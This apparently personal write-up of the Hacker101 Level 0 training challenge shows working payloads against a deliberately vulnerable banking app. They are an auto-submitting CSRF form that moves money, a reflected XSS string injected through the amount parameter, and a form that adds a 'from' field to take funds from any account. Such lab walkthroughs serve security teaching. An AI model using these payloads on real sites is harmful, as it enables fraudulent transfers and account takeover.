# [Hacker101 Level 0](https://levels-a.hacker101.com/levels/0/)

There are some hints in the page source.

## 1 General

Try to send negative amount, it shows an error but you also get a link to a [sample bug report](https://levels-a.hacker101.com/static/report0.txt).

## 2 CSRF

From the report we can see that the target doesn't have any CSRF protection, therefore we can send requests from other resources.

For example:

```html
<body onload="document.forms[0].submit()">
	<form action="http://h101levels.appspot.com/levels/0/" method="POST">
		<input type="hidden" name="amount" value="1000000">
		<input type="hidden" name="to" value="1625">
	</form>
</body>
```

## 3 Reflected XSS 

The amount input tag is vulnerable to XSS.  
You can add it to the querystring and inject XSS.  

For example:
```html
https://levels-a.hacker101.com/levels/0/?to=1258&amount=1"onmouseover="alert('XSS')
```

## 4 Authorization Bypass/Direct Object Reference

You can transfer funds from any account to yours.

For example:

```html
<form action="/levels/0/" method="POST">
    <h2>Transfer Funds</h2>
    Destination account: <input type="input" name="to" value="1258"><br>
    Amount: <input type="input" name="amount" value="1000000">
    <br>
    From: <input type="input" name="from" value="">
    <br>
    <br>
    <input type="submit" value="Transfer">
</form>
```